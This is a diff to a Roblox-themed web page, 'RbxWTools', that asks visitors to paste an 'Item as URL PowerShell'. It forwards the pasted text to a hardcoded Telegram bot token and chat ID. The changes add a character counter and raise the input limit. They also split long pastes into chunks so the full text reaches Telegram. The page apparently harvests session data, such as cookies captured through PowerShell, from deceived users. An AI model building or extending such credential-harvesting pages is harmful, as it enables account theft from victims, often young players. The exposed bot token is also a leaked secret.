@@ -40,20 +40,20 @@
 
         .container {
             width: 100%;
-            max-width: 800px;
+            max-width: 900px;
             text-align: center;
             padding: 30px 20px;
-            margin-top: 40px;
+            margin-top: 20px;
         }
 
         .header {
-            margin-bottom: 40px;
+            margin-bottom: 30px;
             position: relative;
         }
 
         .neon-text {
             font-family: 'Orbitron', sans-serif;
-            font-size: 3.5rem;
+            font-size: 3rem;
             font-weight: 700;
             text-transform: uppercase;
             color: transparent;
@@ -65,29 +65,30 @@
         .domain {
             font-family: 'Orbitron', sans-serif;
             color: #8b9dff;
-            font-size: 1.2rem;
+            font-size: 1.1rem;
             letter-spacing: 2px;
-            margin-bottom: 30px;
+            margin-bottom: 25px;
         }
 
         .input-container {
             position: relative;
-            margin-bottom: 30px;
+            margin-bottom: 25px;
         }
 
         .input-field {
             width: 100%;
-            min-height: 250px;
+            min-height: 300px;
             background: rgba(0, 0, 0, 0.7);
             border: 2px solid #6366f1;
             border-radius: 10px;
             color: #fff;
-            font-family: monospace;
-            font-size: 16px;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
             padding: 20px;
             resize: vertical;
             box-shadow: 0 0 15px rgba(99, 102, 241, 0.7);
             transition: all 0.3s ease;
+            line-height: 1.5;
         }
 
         .input-field:focus {
@@ -103,7 +104,7 @@
             transform: translate(-50%, -50%);
             color: rgba(255, 255, 255, 0.4);
             font-family: 'Orbitron', sans-serif;
-            font-size: 24px;
+            font-size: 20px;
             pointer-events: none;
             text-align: center;
             width: 100%;
@@ -116,35 +117,55 @@
             opacity: 0;
         }
 
+        .char-counter {
+            text-align: right;
+            font-size: 12px;
+            color: #8b9dff;
+            margin-top: 5px;
+        }
+
+        .char-counter.warning {
+            color: #ff6b6b;
+        }
+
         .btn-ready {
             background: linear-gradient(135deg, #6366f1, #8b5cf6);
             color: white;
             border: none;
-            padding: 15px 40px;
+            padding: 15px 50px;
             font-family: 'Orbitron', sans-serif;
-            font-size: 1.2rem;
+            font-size: 1.1rem;
             border-radius: 50px;
             cursor: pointer;
             transition: all 0.3s ease;
             box-shadow: 0 0 15px rgba(139, 92, 246, 0.7);
             letter-spacing: 1px;
             text-transform: uppercase;
+            margin-bottom: 20px;
         }
 
         .btn-ready:hover {
-            transform: translateY(-3px);
+            transform: translateY(-2px);
             box-shadow: 0 0 25px rgba(139, 92, 246, 0.9);
         }
 
         .btn-ready:active {
-            transform: translateY(1px);
+            transform: translateY(0);
+        }
+
+        .btn-ready:disabled {
+            background: #666;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
         }
 
         .status {
-            margin-top: 20px;
+            margin-top: 15px;
             min-height: 24px;
             font-family: 'Rajdhani', sans-serif;
             font-weight: 500;
+            font-size: 14px;
         }
 
         .success {
@@ -157,12 +178,13 @@
 
         .loading {
             display: inline-block;
-            width: 20px;
-            height: 20px;
-            border: 3px solid rgba(255, 255, 255, 0.3);
+            width: 16px;
+            height: 16px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
             border-radius: 50%;
             border-top-color: #6366f1;
             animation: spin 1s ease-in-out infinite;
+            margin-right: 8px;
         }
 
         @keyframes spin {
@@ -179,15 +201,21 @@
 
         @media (max-width: 768px) {
             .neon-text {
-                font-size: 2.5rem;
+                font-size: 2.2rem;
             }
             
             .input-field {
-                min-height: 200px;
+                min-height: 250px;
+                font-size: 13px;
             }
             
             .input-placeholder {
-                font-size: 18px;
+                font-size: 16px;
+            }
+            
+            .btn-ready {
+                padding: 12px 40px;
+                font-size: 1rem;
             }
         }
     </style>
@@ -195,16 +223,17 @@
 <body>
     <div class="container">
         <div class="header">
-            <h1 class="neon-text">RbxWTools</h1>
+            <h1 class="neon-text">RBXWTOOLS</h1>
             <div class="domain">rbxwtools.site</div>
         </div>
         
         <div class="input-container">
-            <textarea class="input-field" placeholder=" " id="userInput"></textarea>
+            <textarea class="input-field" placeholder=" " id="userInput" maxlength="10000"></textarea>
             <div class="input-placeholder">Insert Item as URL PowerShell</div>
+            <div class="char-counter" id="charCounter">0/10000 символов</div>
         </div>
         
-        <button class="btn-ready" id="readyBtn">Ready</button>
+        <button class="btn-ready" id="readyBtn">READY</button>
         
         <div class="status" id="status"></div>
     </div>
@@ -218,6 +247,19 @@
             const userInput = document.getElementById('userInput');
             const readyBtn = document.getElementById('readyBtn');
             const status = document.getElementById('status');
+            const charCounter = document.getElementById('charCounter');
+            
+            // Счетчик символов
+            userInput.addEventListener('input', function() {
+                const length = userInput.value.length;
+                charCounter.textContent = `${length}/10000 символов`;
+                
+                if (length > 9500) {
+                    charCounter.classList.add('warning');
+                } else {
+                    charCounter.classList.remove('warning');
+                }
+            });
             
             readyBtn.addEventListener('click', function() {
                 const text = userInput.value.trim();
@@ -227,7 +269,13 @@
                     return;
                 }
                 
+                if (text.length > 10000) {
+                    showStatus('Message is too long. Maximum 10000 characters.', 'error');
+                    return;
+                }
+                
                 showStatus('Sending to Telegram...', 'loading');
+                readyBtn.disabled = true;
                 
                 // ЗАМЕНИТЕ НА ВАШ ТОКЕН ТЕЛЕГРАМ БОТА И CHAT ID
                 const BOT_TOKEN = '8473082734:AAF2dWLlkxu0Ax3K5naojY1ZJdut0NF9vec';
@@ -237,33 +285,57 @@
             });
             
             function sendToTelegram(message, botToken, chatId) {
-                const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                // Разбиваем сообщение на части если слишком длинное
+                const maxChunkLength = 4000;
+                const messageChunks = [];
                 
-                const payload = {
-                    chat_id: chatId,
-                    text: "🔔 Новое сообщение с RbxWTools:\n\n```\n" + message + "\n```",
-                    parse_mode: "Markdown"
-                };
-                
-                fetch(url, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(payload),
-                })
-                .then(response => response.json())
-                .then(data => {
-                    if (data.ok) {
-                        showStatus('Success! Thank you very much.', 'success');
-                        userInput.value = '';
-                    } else {
-                        showStatus('Error: Failed to send to Telegram. ' + data.description, 'error');
+                if (message.length > maxChunkLength) {
+                    for (let i = 0; i < message.length; i += maxChunkLength) {
+                        messageChunks.push(message.substring(i, i + maxChunkLength));
                     }
-                })
-                .catch(error => {
-                    console.error('Error:', error);
-                    showStatus('Network error. Please check your connection and try again.', 'error');
+                } else {
+                    messageChunks.push(message);
+                }
+                
+                let sentChunks = 0;
+                const totalChunks = messageChunks.length;
+                
+                messageChunks.forEach((chunk, index) => {
+                    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                    
+                    const payload = {
+                        chat_id: chatId,
+                        text: `🔔 Сообщение ${index + 1}/${totalChunks}:\n\n\`\`\`\n${chunk}\n\`\`\``,
+                        parse_mode: "Markdown"
+                    };
+                    
+                    fetch(url, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(payload),
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        sentChunks++;
+                        
+                        if (sentChunks === totalChunks) {
+                            if (data.ok) {
+                                showStatus('Success! Your item has been sent to Telegram.', 'success');
+                                userInput.value = '';
+                                charCounter.textContent = '0/10000 символов';
+                            } else {
+                                showStatus('Error: Failed to send to Telegram. ' + (data.description || ''), 'error');
+                            }
+                            readyBtn.disabled = false;
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Error:', error);
+                        showStatus('Network error. Please check your connection and try again.', 'error');
+                        readyBtn.disabled = false;
+                    });
                 });
             }
             
@@ -278,13 +350,15 @@
                     
                     const text = document.createElement('span');
                     text.textContent = ' ' + message;
-                    text.style.marginLeft = '10px';
                     status.appendChild(text);
                 } else {
                     status.textContent = message;
                     status.classList.add(type);
                 }
             }
+            
+            // Автофокус на поле ввода
+            userInput.focus();
         });
     </script>
 </body>
